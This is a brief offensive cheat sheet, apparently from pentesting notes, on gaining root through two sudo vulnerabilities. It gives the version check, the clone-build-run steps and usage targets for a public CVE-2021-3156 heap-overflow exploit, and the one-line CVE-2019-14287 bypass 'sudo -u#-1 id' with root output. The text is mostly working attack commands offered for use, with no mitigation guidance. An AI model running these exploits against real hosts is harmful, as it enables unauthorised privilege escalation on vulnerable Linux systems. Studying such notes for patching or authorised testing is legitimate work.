# 0-Days
`The Guide`

- [Sudo](#sudo)
  - [usage](#usage)
  - [Sudo policy bypass](#sudo-policy-bypass)


# Sudo
One of the latest vulnerabilities for sudo carries the CVE-2021-3156 and is based on a heap-based buffer overflow vulnerability. This affected the sudo versions:

    1.8.31 - Ubuntu 20.04
    1.8.27 - Debian 10
    1.9.2 - Fedora 33
    and others

To find out the version of sudo, the following command is sufficient:

```bash
sudo -V | head -n1
```
**POC**
```bash
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
```
### Usage
```bash
./sudo-hax-me-a-sandwich

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

  usage: ./sudo-hax-me-a-sandwich <target>

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

```
### Sudo Policy Bypass
> Another vulnerability was found in 2019 that affected all versions below 1.8.28, which allowed privileges to escalate even with a simple command. This vulnerability has the CVE-2019-14287 and requires only a single prerequisite. It had to allow a user in the /etc/sudoers file to execute a specific command.
```bash
sudo -u#-1 id
id
uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)
```
